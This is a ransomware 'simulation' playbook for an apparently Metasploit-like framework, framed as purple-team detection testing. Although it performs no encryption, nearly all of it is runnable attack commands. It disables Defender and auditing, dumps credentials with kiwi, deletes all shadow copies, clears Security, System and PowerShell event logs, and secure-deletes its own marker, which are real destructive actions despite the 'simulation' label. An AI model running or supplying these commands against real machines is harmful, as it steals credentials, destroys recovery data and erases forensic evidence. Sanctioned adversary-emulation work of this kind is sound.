# ===========================================================================
# Megaploit Community Playbook — Ransomware Simulation
# ===========================================================================
# Objective : Simulate a ransomware attack for detection engineering / purple
#             team exercises.  NO real encryption is performed — the simulation
#             exercises the same TTPs a real threat actor would use so that
#             defender tooling can be validated.
#
# TTPs covered (MITRE ATT&CK):
#   T1486  Data Encrypted for Impact          (simulated — touch files, no encrypt)
#   T1490  Inhibit System Recovery            (shadow copy wipe)
#   T1070.001  Event Log Clearing             (log wipe)
#   T1562.001  Impair Defenses: Disable AV    (audit disable)
#   T1083  File and Directory Discovery       (recursive enumerate)
#   T1005  Data from Local System             (stage loot)
#
# Variables:
#   ${SESSION}  — target session ID
#   ${LOOT_DIR} — operator loot directory (default: ./loot)
#
# Usage:
#   resource playbooks/ransomware_sim.rc
# ===========================================================================

session ${SESSION}

# ── Phase 1: Disable Defenses ───────────────────────────────────────────────
audit_disable ProcessCreation
audit_disable NetworkConnection
shell powershell -c "Set-MpPreference -DisableRealtimeMonitoring \$true" 2>nul

# ── Phase 2: Discovery ──────────────────────────────────────────────────────
shell dir /s /b C:\Users\*\Documents\*.docx 2>nul | head -50
shell dir /s /b C:\Users\*\Desktop\*.xlsx  2>nul | head -50
shell net share
shell wmic logicaldisk get caption,description,freespace,size

# ── Phase 3: Credential Access ──────────────────────────────────────────────
kiwi logonpasswords
kiwi sam

# ── Phase 4: Simulate Encryption (DETECTION TRIGGER — no real encryption) ──
# Write a ransom note marker to Desktop to trigger file-write detections
shell echo [SIMULATION] This is a ransomware simulation by ${LHOST}. > C:\Users\Public\Desktop\README_SIMULATION.txt
shell echo Detection timestamp: ${TIMESTAMP} >> C:\Users\Public\Desktop\README_SIMULATION.txt

# ── Phase 5: Inhibit Recovery — Shadow Copy Wipe ────────────────────────────
shell vssadmin delete shadows /all /quiet
shell wmic shadowcopy delete

# ── Phase 6: Event Log Clearing ─────────────────────────────────────────────
log_wipe Security
log_wipe System
log_wipe Application
log_wipe "Windows PowerShell"
log_wipe "Microsoft-Windows-PowerShell/Operational"

# ── Phase 7: Clean Up Simulation Marker ─────────────────────────────────────
secure_delete C:\Users\Public\Desktop\README_SIMULATION.txt

# ── Report ───────────────────────────────────────────────────────────────────
loot list
sessions
